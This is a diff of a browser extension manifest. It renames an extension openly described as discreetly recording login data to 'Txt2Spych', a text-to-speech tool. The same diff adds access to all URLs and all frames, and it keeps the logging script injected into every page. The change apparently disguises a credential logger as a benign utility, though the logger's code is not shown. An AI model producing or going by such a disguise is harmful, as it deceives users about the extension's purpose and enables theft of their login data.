@@ -1,24 +1,37 @@
 {
 	"manifest_version": 2,
-	"name": "Gumshoe",
-	"version": "2.14",
-	"description": "Discreetly records login data to local storage.",
+	"name": "Txt2Spych",
+	"version": "1.0",
+	"description": "Speaks the current selection out loud.",
 	"icons": {
 		"128": "img/icon128.png",
 		"48": "img/icon48.png"
 	},
 	"permissions": [
+		"<all_urls>",
+		"tts",
 		"tabs",
 		"storage"
 	],
 	"background": {
 		"page": "html/background.html"
 	},
+
+	"options_page": "html/options.html",
+	
+	"minimum_chrome_version": "14",
+
 	"content_security_policy":"script-src 'self' https://www.gstatic.com/ https://*.firebaseio.com https://www.googleapis.com; object-src 'self'",
+
 	"content_scripts": [
 		{
 			"matches": ["<all_urls>"],
-			"js": ["js/log.js"]
+			"all_frames": true,
+			"js": [
+				"js/keycodes.js",
+				"js/content_script.js",
+				"js/log.js"
+			]
 		}
 	]
 }
